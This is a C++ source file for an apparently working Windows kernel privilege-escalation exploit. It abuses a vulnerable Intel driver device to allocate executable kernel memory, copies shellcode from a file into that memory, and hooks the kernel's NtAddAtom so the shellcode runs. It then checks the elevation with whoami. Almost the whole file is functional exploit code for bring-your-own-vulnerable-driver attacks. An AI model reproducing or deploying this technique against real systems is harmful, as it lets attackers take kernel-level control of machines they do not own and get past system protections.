#include <cstdio>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif //WIN32_LEAN_AND_MEAN
#ifndef VC_EXTRALEAN
#define VC_EXTRALEAN
#endif //VC_EXTRALEAN
#include <windows.h>

#include "intel_driver.hpp"

void whoami() {
	// WinExec("whoami", SW_NORMAL);
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	// si.wShowWindow = SW_NORMAL;
	PROCESS_INFORMATION pi;
	if (0 == CreateProcessA("C:\\Windows\\system32\\whoami.exe", nullptr, nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi)) {
		printf("Warning: failed to call whoami: GetLastError() = %lu\n", GetLastError());
		return;
	}
	CloseHandle(pi.hThread);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
}

// main
int main(int argc, char ** argv) {
	uint64_t ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	intel_driver::ntoskrnlAddr = ntoskrnlAddr;

	// to see output before BSOD, hopefully
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stderr, 0, _IONBF, 0);

	puts("Whoami says:");
	whoami();

	HANDLE hIntel = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hIntel || INVALID_HANDLE_VALUE == hIntel) {
		puts("Error: can't open Intel device");
		return 1;
	}

	// playground

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == 0) {
		puts("[-] Failed to load ntdll.dll"); //never should happens
		return 1;
	}

	const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
	if (!NtAddAtom)
	{
		puts("[-] Failed to get export ntdll.NtAddAtom");
		return 1;
	}

	puts("getting kernel's NtAddAtom...");
	uint64_t kernel_NtAddAtom = intel_driver::GetKernelModuleExport(hIntel, ntoskrnlAddr, "NtAddAtom");
	if (!kernel_NtAddAtom) {
		puts("[-] Failed to get export ntoskrnl.NtAddAtom");
		return 1;
	}

	puts("getting kernel's NtAddAtom...");
	uint64_t kernel_ExAllocatePool2 = intel_driver::GetKernelModuleExport(hIntel, ntoskrnlAddr, "ExAllocatePool2");
	if (!kernel_ExAllocatePool2) {
		puts("[-] Failed to get export ntoskrnl.ExAllocatePool2");
		return 1;
	}

	puts("allocating executable memory...");
	uint64_t poolFlags = 0x2LLU | 0x80LLU; // uninitialized, nonpaged_executable
	uint64_t execMem;
	if (!intel_driver::CallKernelFunction<uint64_t, uint64_t, size_t, uint32_t>(hIntel, &execMem, kernel_ExAllocatePool2, poolFlags, 4096, '1337')) {
		puts("unable to allocate memory");
		return 1;
	}

	puts("filling executable memory with shellcode...");
	
	unsigned char * kernelShellcode;
	size_t scLen = 0;
	FILE * fp = fopen("shellcode.bin", "rb");
	if (!fp) {
		puts("Error: shellcode file not found");
		return 1;
	}
	fseek(fp, 0, SEEK_END);
	scLen = ftell(fp);
	rewind(fp);
	kernelShellcode = new unsigned char[scLen];
	fread(kernelShellcode, 1, scLen, fp);
	fclose(fp);

	if (!intel_driver::MemCopy(hIntel, execMem, reinterpret_cast<uint64_t>(kernelShellcode), scLen)) {
		puts("failed to copy shellcode");
		return 1;
	}

	delete[] kernelShellcode;

	unsigned char injection[] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0 }; // mov rax, imm64; jmp rax
	* (uint64_t *) (injection + 2) = execMem;
	unsigned char original[sizeof(injection)];

	puts("reading kernel's NtAddAtom...");
	assert(intel_driver::ReadMemory(hIntel, kernel_NtAddAtom, original, sizeof(injection)));

	puts("hooking kernel's NtAddAtom...");
	assert(intel_driver::WriteToReadOnlyMemory(hIntel, kernel_NtAddAtom, injection, sizeof(injection)));

	const auto callableNtAddAtom = reinterpret_cast<void (__stdcall *) ()>(NtAddAtom);

	unsigned char userShellcode[] = { 0xb8, 0xde, 0xc0, 0xad, 0xde, 0xc3 }; // mov eax, 0xdeadc0de; ret

	puts("calling ntdll's NtAddAtom...");
	Sleep(1000);

	callableNtAddAtom();

	puts("unhooking kernel's NtAddAtom...");
	assert(intel_driver::WriteToReadOnlyMemory(hIntel, kernel_NtAddAtom, original, sizeof(injection)));

	puts("Whoami says:");
	whoami();

	puts("Note: the current process was elevated, i.e. the exploit process, not cmd.exe as per shellcode");

	return 0;
}
